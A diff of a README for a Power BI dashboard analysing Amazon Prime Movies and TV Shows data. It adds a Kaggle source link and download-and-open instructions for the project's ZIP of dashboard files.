@@ -4,7 +4,7 @@
 This project involves the analysis and visualization of Amazon Prime Movies and TV Shows data using a Power BI dashboard. The dashboard is designed to provide insights into various metrics and key indicators, making the data easily accessible and understandable.
 
 ## Dataset
-- **Source**: [Link to the data source or description]
+- **Source**: [Amazon Prime Movies and TV Shows Dataset on Kaggle](https://www.kaggle.com/datasets/shivamb/amazon-prime-movies-and-tv-shows)
 - **Total Data**: 9,651 titles, 518 genres, 5,769 directors, and 25 ratings
 - **Time Period**: Data ranges from 1920 to 2021
 
@@ -16,6 +16,17 @@ This project involves the analysis and visualization of Amazon Prime Movies and 
 - **Total Shows by Release Year**: Illustrates the number of TV shows and movies released each year with a line graph.
 - **Movies and TV Shows Ratio**: Visualizes the proportion of movies and TV shows using a donut chart.
 
+## Download the Project Files
+You can download the Power BI dashboard and related files from the link below:
+
+[Download the files](https://github.com/demna0920/Amazon-Prime-Data-Analysis/blob/main/images.zip)
+
+## How to Use
+1. [Download the project files](https://github.com/demna0920/Amazon-Prime-Data-Analysis/blob/main/images.zip).
+2. Extract the ZIP file.
+3. Open the `.pbix` file in Power BI Desktop.
+4. Explore the dashboard and data analysis.
+
 ## Key Features
 - **Dynamic Visualization**: The dashboard allows for the exploration of different aspects of the data through interactive visualizations.
 - **Filtering Options**: Users can apply custom filters to analyze the data based on specific criteria.
@@ -24,14 +35,5 @@ This project involves the analysis and visualization of Amazon Prime Movies and 
 ## Tools Used
 - **Power BI**: For data visualization and dashboard creation.
 - **Microsoft Bing Maps**: Used for map visualizations to display the number of shows by country.
-
-## Dashboard Preview
-![Uploading Screenshot 2024-08-26 at 8.06.04 PM.png…]()
-
-
-## Installation and Usage
-1. Download the `.pbix` file from the repository.
-2. Install Power BI Desktop and open the downloaded file.
-3. Explore the dashboard and review the analysis results.
 
 
